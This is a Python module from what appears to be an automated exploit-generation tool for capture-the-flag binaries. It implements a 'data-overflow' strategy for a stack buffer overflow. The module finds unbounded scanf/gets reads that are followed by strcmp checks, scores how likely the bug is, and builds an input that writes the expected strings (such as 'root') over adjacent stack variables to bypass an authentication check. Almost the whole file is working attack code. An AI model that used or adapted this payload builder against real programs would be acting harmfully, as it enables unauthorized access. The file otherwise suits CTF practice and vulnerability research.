"""Data-overflow / auth-bypass strategy.

The classic "overwrite an adjacent variable so a strcmp passes" bug: an
unbounded read writes forward over other stack variables that are later
compared against fixed strings. We craft a single input token that places the
required constant at every compared offset, with NUL separators between them.

Example (who_are_you):
    scanf("%s", buf)           # input at offset 0
    strcmp(buf+0,    "root")   # place "root" at 0
    strcmp(buf+0x64, "root")   # place "root" at 0x64  (reachable: 0x64 >= 0)
  -> token = b"root" + b"\\x00"*96 + b"root"
"""
from .base import Strategy


def build_placement(pairs, filler=b"\x00"):
    end = max(off + len(val) + 1 for off, val in pairs)
    buf = bytearray(filler * end)
    for off, val in pairs:
        buf[off:off + len(val)] = val
    return bytes(buf).rstrip(b"\x00")          # scanf appends the final NUL


class DataOverflow(Strategy):
    name = "data-overflow"
    desc = "overwrite adjacent vars to satisfy strcmp checks"

    def _plan(self, ctx):
        a = ctx.analysis
        inp = a.primary_input
        if not inp or not inp.unbounded or not a.checks:
            return None, None
        base = inp.off
        reachable, unreachable = [], []
        for c in a.checks:
            pos = c.off - base
            (reachable if pos >= 0 else unreachable).append((pos, c.const))
        return reachable, unreachable

    def detect(self, ctx):
        reachable, unreachable = self._plan(ctx)
        if reachable is None:
            return 0, "no unbounded read + strcmp pattern"
        if unreachable:
            return 15, (f"{len(unreachable)} check(s) are BEHIND the input "
                        "buffer (not reachable by a forward overflow)")
        # all gating checks reachable -> very likely the intended bug
        return 90, f"{len(reachable)} strcmp check(s) all reachable by overflow"

    def build(self, ctx):
        reachable, unreachable = self._plan(ctx)
        if not reachable:
            return None, False, "nothing to place"
        pairs = sorted(reachable)
        # scanf("%s") stops at whitespace, so a constant containing it can't be
        # placed; gets/read take raw bytes, so only guard the scanf case.
        if ctx.analysis.primary_input.func == "scanf":
            for _, v in pairs:
                if any(w in v for w in (b" ", b"\t", b"\n", b"\x0b", b"\x0c", b"\r")):
                    return None, False, f"value {v!r} contains whitespace"
        payload = build_placement(pairs)
        note = "place " + ", ".join(f"{hex(o)}={v!r}" for o, v in pairs)
        if unreachable:
            note += f"  (WARNING: {len(unreachable)} unreachable check remains)"
        return payload, False, note
